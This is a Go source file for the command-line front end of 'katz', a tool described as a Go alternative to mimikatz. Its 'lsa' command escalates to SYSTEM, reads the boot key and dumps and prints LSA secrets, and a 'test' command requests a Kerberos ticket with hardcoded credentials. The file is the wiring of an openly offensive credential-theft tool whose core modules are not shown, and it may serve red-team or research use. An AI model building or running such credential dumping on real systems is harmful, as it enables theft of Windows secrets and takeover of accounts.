package cli

import (
	"fmt"

	"github.com/spf13/cobra"
	test 			"katz/katz/modules/kerb"
	katz_utils 		"katz/katz/utils"
	katz_modules	"katz/katz/modules"
)

var rootCmd = &cobra.Command{
	Use: "katz.exe",
	Short: "Go go gadget katz!",
	Long: `A go alternative to mimikatz.exe`,
	Run: func(cmd *cobra.Command, args []string) {
		PrintBanner()
	},
}
const banner = `
  /\_/\  (    ██╗  ██╗ █████╗ ████████╗███████╗
 ( ^.^ ) _)   ██║ ██╔╝██╔══██╗╚══██╔══╝╚══███╔╝
   \"/"  (     █████╔╝ ███████║   ██║     ███╔╝ 
 ( | | )      ██╔═██╗ ██╔══██║   ██║    ███╔╝  
(__d b__)      ██║  ██╗██║  ██║   ██║   ███████╗
               ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝`


var testCmd = &cobra.Command{
	Use: "test",
	Short: "run test code",
	Run: func (cmd *cobra.Command, args []string)  {
		test.TGT("test.local", "Administrator", "password")
	},
}
var lsa = &cobra.Command{
	Use: "lsa",
	Short: "do something with the LSA database",
	Run: func (cmd *cobra.Command, args []string) {
		dump, _ := cmd.Flags().GetString("dump")
		history, _ := cmd.Flags().GetBool("history")
		output := ""
		nonvistastyle, _ := cmd.Flags().GetBool("nonvistastyle")
		nonvistastyle = !nonvistastyle
		if dump != "" {
			token, err := katz_utils.GetSystem()
			if err != nil {
				fmt.Println(err)
				return
			}
			
			bootKey, err := katz_modules.GetBootKey(token)
			secrets, err := katz_modules.DumpLSASecrets(token, bootKey, nonvistastyle, history)
			for index := range secrets {
				output += secrets[index].PrintSecret() + "\n"
			}
		}
		fmt.Println(output)
	},
}

func PrintBanner(){
	fmt.Println(banner)
}
func Init() {
	lsa.Flags().String("dump", "", "dump lsa database")
	lsa.Flags().Bool("history", false, "get lsa history")
	lsa.Flags().Bool("nonvistastyle", false, "non vista style?")
	rootCmd.AddCommand(testCmd)
	rootCmd.AddCommand(lsa)
	rootCmd.Execute()
}